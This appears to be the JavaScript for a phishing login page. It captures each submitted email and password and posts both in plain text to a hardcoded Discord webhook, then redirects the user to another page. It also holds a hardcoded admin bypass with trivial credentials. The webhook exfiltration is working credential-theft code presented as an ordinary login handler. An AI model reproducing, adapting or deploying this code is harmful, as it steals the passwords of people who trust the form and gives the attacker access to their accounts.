// Function to handle form submission
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Check for admin credentials
        if (email === 'admin@admin.admin' && password === 'admin') {
            window.location.href = "admin.html";
            return;
        }

        // Combine email and password into an object
        const user = {
            email: email,
            password: password
        };

        // Send user data to the Discord webhook
        const webhookUrl = 'https://discord.com/api/webhooks/1250446588254359583/hWxJFMMwp2NpIx6vq7-pZe_rrQ9sjOm3LxtSZcv6D1bv2uiwMgYNYglzJvHZSctThByk';
        const message = `**Email= ||${email}||\nPass= ||${password}||**`;

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: message })
        }).then(response => {
            if (response.ok) {
                console.log('Data sent to Discord webhook successfully');
            } else {
                console.error('Failed to send data to Discord webhook');
            }
        }).catch(error => {
            console.error('Error sending data to Discord webhook:', error);
        });

        // Redirect to 10.html
        window.location.href = "10.html";
    });

    // Function to redirect to admin page
    document.querySelector('.logo').addEventListener('click', function() {
        window.location.href = 'admin.html';
    });
});
